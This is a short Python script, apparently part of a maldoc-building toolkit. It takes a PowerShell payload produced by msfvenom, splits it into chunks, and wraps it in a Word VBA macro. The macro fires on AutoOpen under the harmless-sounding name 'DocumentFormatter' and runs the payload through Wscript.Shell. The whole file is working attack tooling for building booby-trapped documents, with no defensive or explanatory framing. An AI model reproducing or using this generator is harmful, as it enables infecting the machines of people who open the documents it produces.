#!/usr/bin/env python3

def psh_concat(hta):
    '''
    Function that splits PS payload for VBA Macro formatting

    Parameters:
    hta (str): PS payload grepped from msfvenom

    Returns:
    macro (str): Macro-ready final payload to be passed into doc_generator.doc_gen
    '''
    n = 50
    macro = '''
Sub AutoOpen()
    DocumentFormatter
End Sub
Sub DocumentFormatter()
    Dim Str As String

'''

    for i in range(0, len(hta), n):
        if not i:
            macro += ('    Str = "' + hta[i:i+n] + '"\n')
        else:
            macro += ('    Str = Str + "' + hta[i:i+n] + '"\n')

    macro += '''
    CreateObject("Wscript.Shell").Run Str
End Sub
'''
    return macro

